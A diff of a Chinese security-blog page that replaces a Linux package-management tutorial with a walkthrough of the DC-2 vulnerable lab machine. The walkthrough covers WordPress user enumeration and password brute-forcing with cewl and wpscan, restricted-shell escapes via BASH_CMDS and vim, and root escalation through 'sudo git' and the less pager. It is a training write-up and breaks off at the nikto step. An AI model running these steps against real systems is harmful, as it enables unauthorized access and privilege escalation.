@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="keywords" content="Linux 软件包管理教程">
+    <meta name="keywords" content="dc系列——dc2">
     
     <meta name="author" content="lee">
     
@@ -123,7 +123,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://leei.site/2025/11/24/第六次作业_linux软件包管理/"/>
+    <link rel="canonical" href="https://leei.site/2025/11/27/dc系列——dc2/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -133,14 +133,14 @@
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux 软件包管理教程">
-<meta property="og:url" content="https://leei.site/2025/11/24/%E7%AC%AC%E5%85%AD%E6%AC%A1%E4%BD%9C%E4%B8%9A_linux%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86/index.html">
+<meta property="og:title" content="dc系列——dc2">
+<meta property="og:url" content="https://leei.site/2025/11/27/dc%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94dc2/index.html">
 <meta property="og:site_name" content="Lee&#39;s SecLab">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://leei.site/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-11-24T01:17:46.194Z">
-<meta property="article:modified_time" content="2025-11-24T09:19:22.618Z">
+<meta property="article:published_time" content="2025-11-26T20:20:06.027Z">
+<meta property="article:modified_time" content="2025-11-27T04:21:03.104Z">
 <meta property="article:author" content="Le_ee 博客等级 码龄1年">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://leei.site/images/redefine-og.webp">
@@ -155,7 +155,7 @@
     
     <title>
         
-            Linux 软件包管理教程 | lee&#39;s seclab
+            dc系列——dc2 | lee&#39;s seclab
         
     </title>
 
@@ -585,7 +585,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -608,7 +608,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Linux 软件包管理教程</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">dc系列——dc2</h1>
 			</div>
 			
 		</div>
@@ -629,15 +629,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-11-24 09:17:46</span>
-        <span class="mobile">2025-11-24 09:17:46</span>
+        <span class="desktop">2025-11-27 04:20:06</span>
+        <span class="mobile">2025-11-27 04:20:06</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-11-24 17:19:22</span>
-            <span class="mobile">2025-11-24 17:19:22</span>
+            <span class="desktop">2025-11-27 12:21:03</span>
+            <span class="mobile">2025-11-27 12:21:03</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -664,613 +664,261 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<meta name="referrer" content="no-referrer"/>
-Rocky Linux8 -YUM/DNF包管理
+			<p>总结：</p>
+<meta name="referrer" content="no-referrer"/>
 
-<p>列出所有启用的仓库</p>
+<ul>
+<li>官网提示需要在靶机的host文件中添加靶机映射</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure></div>
+
+<p>其中etc目录中包含了几乎所有系统服务和程序的配置文件，hosts是本地域名解析文件，当浏览器拿到一个域名，会优先去本地查找域名解析，观察其对应ip</p>
+<p>vim编辑器添加映射</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/f31481f18e5f493a93b083c2dada86c5.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/dd91d30ee8e144d6a3f0f405d6b7611f.png"
                      
                 ></p>
-<p>列出所有仓库，包括禁用的</p>
+<p>补充：（cat &#x2F;etc&#x2F;passwd可查看用户列表）</p>
+<ul>
+<li>*<em>rbash与&#x2F;bin&#x2F;bash</em></li>
+</ul>
+<p>前者相当于试用版shell，受限更多，像一个小笼子，要想办法逃逸到&#x2F;bin&#x2F;bash，之后再进一步提权</p>
+<p>学习一些常用的逃逸手段：</p>
+<p>1：看”&#x2F;“有没有被允许使用，允许直接用&#x2F;bin&#x2F;bash(注：本节尝试失败，限制图如下)</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/cbd2f27ad887492ea718f73eb0f79c6b.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/e95221322e4643188eaabe12de4862f7.png"
                      
                 ></p>
-<p>配置仓库</p>
-<p>添加 EPEL 仓库</p>
+<p>2.BASH_CMDS环境变量逃逸（本节可用）</p>
+<p>ps：关联数组就是用文字命名的数组</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=&#x27;/bin/sh;a&#x27;</span><br><span class="line">&amp;#x2B07;</span><br><span class="line">#BASH_CMDS &amp;#x662F; Bash &amp;#x7684;&amp;#x4E00;&amp;#x4E2A;&amp;#x5173;&amp;#x8054;&amp;#x6570;&amp;#x7EC4;&amp;#xFF0C;&amp;#x7528;&amp;#x4E8E;&amp;#x5B58;&amp;#x50A8;&amp;#x547D;&amp;#x4EE4;&amp;#x522B;&amp;#x540D;</span><br><span class="line">#[a]=&#x27;/bin/sh&amp;#x2014;&amp;#x2014;&amp;#x521B;&amp;#x5EFA;&amp;#x4E00;&amp;#x4E2A;&amp;#x53EB;a&amp;#x7684;&amp;#x547D;&amp;#x4EE4;&amp;#xFF0C;&#x27;/bin/sh;a&#x27; &amp;#x662F;&amp;#x8FD9;&amp;#x4E2A;&amp;#x522B;&amp;#x540D;&amp;#x5BF9;&amp;#x5E94;&amp;#x7684;&amp;#x503C;</span><br><span class="line">#/bin/sh&amp;#x610F;&amp;#x601D;&amp;#x662F;&amp;#x542F;&amp;#x52A8;&amp;#x4E00;&amp;#x4E2A;shell</span><br><span class="line">#;&amp;#x547D;&amp;#x4EE4;&amp;#x5206;&amp;#x9694;&amp;#x7B26;</span><br><span class="line">#a&amp;#x518D;&amp;#x6B21;&amp;#x6267;&amp;#x884C;a&amp;#x547D;&amp;#x4EE4;&amp;#xFF0C;&amp;#xFF0C;&amp;#x5F62;&amp;#x6210;&amp;#x4E00;&amp;#x4E2A;&amp;#x5FAA;&amp;#x73AF;&amp;#xFF08;&amp;#x6B64;&amp;#x65F6;&amp;#x4EE5;&amp;#x53CA;&amp;#x5728;&amp;#x65B0;&amp;#x7684;shell&amp;#x91CC;&amp;#x9762;&amp;#x4E86;&amp;#xFF09;</span><br><span class="line">&amp;#x2B07;</span><br><span class="line">#&amp;#x4FEE;&amp;#x590D;&amp;#x73AF;&amp;#x5883;&amp;#x53D8;&amp;#x91CF;</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br><span class="line">#&amp;#x628A;&amp;#x4E00;&amp;#x4E9B;&amp;#x4F4D;&amp;#x4E8E; /bin/ &amp;#x548C; /usr/bin/ &amp;#x76EE;&amp;#x5F55;&amp;#x7684;&amp;#x547D;&amp;#x4EE4;&amp;#x8DEF;&amp;#x5F84;&amp;#xFF08;&amp;#x5982; ls, cat, whoami&amp;#xFF09;&amp;#x6DFB;&amp;#x52A0;&amp;#x5230; PATH &amp;#x4E2D;&amp;#xFF0C;&amp;#x7CFB;&amp;#x7EDF;&amp;#x624D;&amp;#x80FD;&amp;#x627E;&amp;#x5230;&amp;#x8FD9;&amp;#x4E9B;&amp;#x547D;&amp;#x4EE4;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>3：vi&#x2F;vim编辑器逃逸（本节可用）</p>
+<p>vi&#x2F;vim 通常被允许在 rbash 环境中使用</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vi/vim</span><br><span class="line">#&amp;#x542F;&amp;#x52A8;&amp;#x7F16;&amp;#x8BD1;&amp;#x5668;</span><br><span class="line">&amp;#x2B07;</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">#:set&amp;#xFF1A;vi/vim &amp;#x7684;&amp;#x8BBE;&amp;#x7F6E;&amp;#x547D;&amp;#x4EE4;</span><br><span class="line">#shell=/bin/sh&amp;#xFF1A;&amp;#x544A;&amp;#x8BC9; vi/vim &amp;#x5F53;&amp;#x6267;&amp;#x884C;&amp;#x5916;&amp;#x90E8;&amp;#x547D;&amp;#x4EE4;&amp;#x65F6;&amp;#xFF0C;&amp;#x4F7F;&amp;#x7528; /bin/sh &amp;#x4F5C;&amp;#x4E3A; shell&amp;#xFF0C;&amp;#x6539;&amp;#x53D8;&amp;#x4E86; vi/vim &amp;#x7684;&amp;#x9ED8;&amp;#x8BA4; shell &amp;#x89E3;&amp;#x91CA;&amp;#x5668;</span><br><span class="line">&amp;#x2B07;</span><br><span class="line">:shell</span><br><span class="line">#&amp;#x542F;&amp;#x52A8;shell&amp;#xFF08;/bin/sh&amp;#xFF09;,&amp;#x8FD9;&amp;#x4E2A;&amp;#x65B0; shell &amp;#x4E0D;&amp;#x7EE7;&amp;#x627F; rbash &amp;#x7684;&amp;#x9650;&amp;#x5236;</span><br><span class="line">&amp;#x2B07;</span><br><span class="line">#&amp;#x4FEE;&amp;#x590D;&amp;#x73AF;&amp;#x5883;&amp;#x53D8;&amp;#x91CF;&amp;#xFF0C;&amp;#x540C;&amp;#x524D;&amp;#x4E00;&amp;#x79CD;&amp;#x65B9;&amp;#x6CD5;</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>CMS</li>
+</ul>
+<p><strong>CMS是一个可以通过浏览器进行管理的、功能完整的网站应用程序，就是一个建站系统，常用的有我们在dc1里遇见的drupal,还有wordpress，joomla</strong></p>
+<p><strong>就是一个能帮助我们轻松建立网站的程序</strong></p>
+<p><strong>我们之所以要识别这个CMS，是为了搞清楚在80端口上的那个网页是基于什么程序建立的，从而找到漏洞从这里去突破</strong></p>
+<ul>
+<li><strong>nikto</strong>进行登录界面的url路径猜测(-h:目标主机)</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h XX.XX.XX.XX</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>cewl爬取这个网站生成自己的字典</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://XX.XX.XX.XX -w pass.txt</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>wpscan扫用户，匹配密码</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -U admin -P pass.txt</span><br><span class="line">wpscan --url http://dc-2 -e u</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>命令补充</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># less&amp;#x67E5;&amp;#x770B;&amp;#x6587;&amp;#x4EF6;</span><br><span class="line">less /etc/passwd</span><br><span class="line"># &amp;#x5728;less&amp;#x4E2D;&amp;#x7684;&amp;#x64CD;&amp;#x4F5C;&amp;#xFF1A;</span><br><span class="line"># - &amp;#x7A7A;&amp;#x683C;&amp;#x952E;&amp;#xFF1A;&amp;#x5411;&amp;#x4E0B;&amp;#x7FFB;&amp;#x9875;</span><br><span class="line"># - b&amp;#x952E;&amp;#xFF1A;&amp;#x5411;&amp;#x4E0A;&amp;#x7FFB;&amp;#x9875;</span><br><span class="line"># - /&amp;#x5173;&amp;#x952E;&amp;#x8BCD;&amp;#xFF1A;&amp;#x641C;&amp;#x7D22;</span><br><span class="line"># - q&amp;#x952E;&amp;#xFF1A;&amp;#x9000;&amp;#x51FA;</span><br><span class="line"></span><br><span class="line">#ls&amp;#x7565;</span><br><span class="line"></span><br><span class="line">#scp&amp;#x2014;&amp;#x2014;&amp;#x6587;&amp;#x4EF6;&amp;#x4F20;&amp;#x8F93;</span><br><span class="line"># &amp;#x4ECE;&amp;#x672C;&amp;#x5730;&amp;#x590D;&amp;#x5236;&amp;#x5230;&amp;#x8FDC;&amp;#x7A0B;</span><br><span class="line">scp file.txt user@remote:/path/</span><br><span class="line"></span><br><span class="line">#vi&amp;#x6587;&amp;#x672C;&amp;#x7F16;&amp;#x8F91;&amp;#x5668;</span><br><span class="line"># &amp;#x5728;vi&amp;#x4E2D;&amp;#x7684;&amp;#x57FA;&amp;#x672C;&amp;#x64CD;&amp;#x4F5C;&amp;#xFF1A;</span><br><span class="line"># - i&amp;#x952E;&amp;#xFF1A;&amp;#x8FDB;&amp;#x5165;&amp;#x63D2;&amp;#x5165;&amp;#x6A21;&amp;#x5F0F;</span><br><span class="line"># - Esc&amp;#x952E;&amp;#xFF1A;&amp;#x9000;&amp;#x51FA;&amp;#x63D2;&amp;#x5165;&amp;#x6A21;&amp;#x5F0F;</span><br><span class="line"># - :wq&amp;#xFF1A;&amp;#x4FDD;&amp;#x5B58;&amp;#x5E76;&amp;#x9000;&amp;#x51FA;</span><br><span class="line"># - :q!&amp;#xFF1A;&amp;#x4E0D;&amp;#x4FDD;&amp;#x5B58;&amp;#x9000;&amp;#x51FA;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>git提权</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help config</span><br><span class="line">#git &amp;#x4EE5; root &amp;#x6743;&amp;#x9650; &amp;#x542F;&amp;#x52A8;&amp;#xFF0C;&amp;#x8C03;&amp;#x7528;&amp;#x5206;&amp;#x9875;&amp;#x5668; less &amp;#x6765;&amp;#x663E;&amp;#x793A;&amp;#x5E2E;&amp;#x52A9;&amp;#x6587;&amp;#x672C;</span><br><span class="line">#&amp;#x56E0;&amp;#x4E3A; git &amp;#x662F; root&amp;#xFF0C;&amp;#x6240;&amp;#x4EE5; less &amp;#x4E5F;&amp;#x4EE5; root &amp;#x6743;&amp;#x9650; &amp;#x8FD0;&amp;#x884C;</span><br><span class="line">&amp;#x2B07;</span><br><span class="line">!/bin/bash</span><br><span class="line">#! = &amp;#x5728;&amp;#x5206;&amp;#x9875;&amp;#x5668;&amp;#x4E2D;&amp;#x6267;&amp;#x884C;&amp;#x5916;&amp;#x90E8;&amp;#x547D;&amp;#x4EE4;&amp;#x7684;&amp;#x7279;&amp;#x6B8A;&amp;#x524D;&amp;#x7F00;</span><br><span class="line">#/bin/bash = &amp;#x8981;&amp;#x542F;&amp;#x52A8;&amp;#x7684; shell</span><br></pre></td></tr></table></figure></div>
+
+<p>** 攻击流程： **</p>
+<p>扫ip</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/1fdbbcbd4cf7421aa87b14d93c65fcbd.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/d013f7382e4c408d9e0bda3f5156ead2.png"
                      
                 ></p>
+<p>扫可疑ip</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/f449afede00440b683d59eb76e655e3a.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/ee723d03d3d449f0952a83c82d40f7bf.png"
                      
                 ></p>
-<p>启用或禁用仓库 dnf config-manager – (disable&#x2F;enable) repository-name</p>
-<p>软件包搜索和查询</p>
-<p>搜索软件包:</p>
+<p>看到常用端口80和7744开启，进一步侵略性扫描</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/529cdd1c687e44f19b116669a7eb6ad2.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/fdbe5808f24241c684294856b2cd520d.png"
                      
                 ></p>
-<p>查看软件包详细信息</p>
+<p>分析得到的关键数据：</p>
+<p>80端口对应着web渗透方向，并且我们可以看到这里对应的CMS是wordpress，版本是4.7.10</p>
+<p>然后7744端口对应着ssh渗透，可以通过爆破和版本漏洞进行攻击</p>
+<p>我们先尝试攻击80端口</p>
+<p>输入dc-2登录网页，找到第一个flag入口</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/076485a90b1d41e48b33c522d27e256c.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/b8101a931a0e4429bb8cabd8b2e0aa5e.png"
                      
                 ></p>
-<p>列出所有可安装的包:</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/dd3ad21760574706919cdfaa55f29348.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/4af5a19d780b4247ac321e903c1eff78.png"
                      
                 ></p>
-<p>列出已安装的包:</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/7961cfa3dd794311a17377f4717a9f7c.png"
-                     
-                ></p>
-<p>查找提供特定文件的包:</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/660c31092a2246f0a14a990e2ce88496.png"
-                     
-                ></p>
-<p>查看包的依赖关系</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/9c9073318b9f47d89244f415b002e6d8.png"
-                     
-                ></p>
-<p>软件包安装</p>
-<p>安装单个软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/daefac7f5db240d9a27bbb157be464f2.png"
-                     
-                ></p>
-<p>安装多个软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/30d8fa086f3648d28be6d2d8c4e192e2.png"
-                     
-                ></p>
-<p>从本地rpm文件安装</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/3889c4ef555045269ff6fbc05edc6a1f.png"
-                     
-                ></p>
-<p>重新安装软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/e68a8ce187254931b2e19e77de3dffbf.png"
-                     
-                ></p>
-<p>安装软件包组</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/0f975e4b77244f53bc00f32a5a6c5dc0.png"
-                     
-                >列出可用的组</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/1cb9e49d61b04c1a836e574620f0e331.png"
-                     
-                ></p>
-<p>检查可更新的软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/08db0faf8c1a4331b1c790e12db33e46.png"
-                     
-                ></p>
-<p>更新单个软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/13392af9f1f946a9835ca6dd498cfa23.png"
-                     
-                ></p>
-<p>更新系统</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/5b93bcf1cde0434bb95b76879aa19fc0.png"
-                     
-                ></p>
-<p>仅下载更新不安装</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/a0b9884dd34e4c69b9429fbbbe9513e4.png"
-                     
-                ></p>
-<p>卸载软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/c1d87e3b9b164c3e9a4c0f48684fad10.png"
-                     
-                ></p>
-<p>清理不再需要的依赖</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/affc3efc52434f56ad523766efbbd054.png"
-                     
-                ></p>
-<p>清理所有缓存</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/96c1e5b34435471e88ff7850400cd18f.png"
-                     
-                ></p>
-<p>清理包缓存</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/46e77544a11f471aa9c81180e074eb85.png"
-                     
-                ></p>
-<p>清理元数据缓存</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/720f90d6f39d4bb29fe558122484e324.png"
-                     
-                ></p>
-<p>清理过期缓存</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/ac0928811efe435d91a832b046a77592.png"
-                     
-                ></p>
-<p>历史记录管理</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/8ccf09b169214b269027dd57965425f7.png"
-                     
-                ></p>
-<p>查看具体操作详情</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/de60491100b846639b87a7f11550f6e9.png"
-                     
-                ></p>
-<p>撤销&#x2F;重做&#x2F;回滚</p>
-<p>dnf history undo&#x2F;redo&#x2F;rollback 5</p>
-<h3 id="Ubuntu-22-04-APT-包管理"><a href="#Ubuntu-22-04-APT-包管理" class="headerlink" title="Ubuntu 22.04 - APT 包管理"></a>Ubuntu 22.04 - APT 包管理</h3><p>备份原始源文件</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/c5c226b4f5574bbe840fab48786d4831.png"
-                     
-                ></p>
-<p>编辑软件源</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/f8ac0f94df8344638da87e5d2e54e112.png"
-                     
-                ></p>
-<p>更新包索引（定期执行）</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/3b85eb8b2a5f494888cf8c46a874dde4.png"
-                     
-                ></p>
-<p>更新并显示可升级的包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/813ca1e4e75f424f98bcf64d69a2d2f3.png"
-                     
-                ></p>
-<p>搜索软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/5b8cb20fade141be92cddc79a3799dea.png"
-                     
-                ></p>
-<p>搜索精确匹配</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/12742e071efa4593b58cd670304e9eb1.png"
-                     
-                ></p>
-<p>查看包详细信息</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/9c2e0295fc15408d8c56c541816ca4c3.png"
-                     
-                ></p>
-<p>列出所有可安装的包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/7c2c0ec6b6af41c7bf6aaa5ccdd297bb.png"
-                     
-                ></p>
-<p>列出已安装的包</p>
-<p><img  
+<p>translate：你惯用字典或许并不适用，所以不妨换一种方式，也许你需要用cewl。密码越多越好，但大部分时候你很难全部获得。 用一个身份登录以获得下一个flag， 如果没有，就用另一个身份登录。</p>
+<p>提取有效信息：</p>
+<p>1.一般字典不行</p>
+<p>2.提到了cewl工具</p>
+<p>3.需要几个账号密码去登录拿到下一个flag</p>
+<p>所以我们下一步用cewl爬取这个网站生成自己的字典</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.145.180 -w dc2password.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>运行这个命令之后，ceWL会从首页开始爬这个网站所有可以访问链接，默认深度为2（也就是从指定的起始界面0+起始页面上能访问的直接链接1+一层间接链接2）</p>
+<p>然后分析所有页面的文本内容，从中提取单词生成一个字典大纲，我们可以从这些包含网站信息的词里猜测密码</p>
+<p>cat dc2password.txt发现爆出了很多敏感词汇<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/a94c945b791047918b8cc7ba570b71b7.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/18b230c933484dc2ac5a49b870c91ed0.png"
                      
                 ></p>
-<p>列出可升级的包</p>
+<p>然后使用工具wpscan</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -e u</span><br></pre></td></tr></table></figure></div>
+
+<p>–url指定要扫描的目标网站url，后面跟目标网站的网址</p>
+<p>-e表示枚举，u是用户</p>
+<p>看结果出来三个用户——admin,jerry,tom</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/70e8a736bb6841cf8cfd50b4d88bdca8.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/b39a85c4387045cdad470605ec1ea6aa.png"
                      
                 ></p>
-<p>查找包含特定文件的包</p>
+<p>继续用wpscan，加上我们之前扫出来的dc-2password字典逐个扫每一个用户名，看能不能找到对应密码</p>
+<p>-u指定用户，-p是指定密码字典文件</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -U admin -P dc2password.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>admin</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/4016022d60a14f4f93123364ef0de3cc.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/a1bcbd072ff2418299a8672d4f02ad54.png"
                      
                 ></p>
-<p>查看包的依赖关系</p>
+<p>tom——successsed</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/9a7254fa1dac4c8e9ffbec3df2ffe21b.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/546b21db01f54c5b85013ebb1f01847f.png"
                      
                 ></p>
-<p>查看哪些包依赖此包</p>
+<p>jerry——successed</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/d9d17cebe91c4b359c3dce1aa9c20e1b.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/5cca2f243da845e6b99eb9fb23ad863a.png"
                      
                 ></p>
-<p>软件包安装</p>
-<p>安装单个软件包</p>
+<p>所以我们现在得到了两对账户密码，但是没有登录界面</p>
+<p>用nikto进行登录界面的url路径猜测</p>
+<p>-h 指定扫描的目标主机</p>
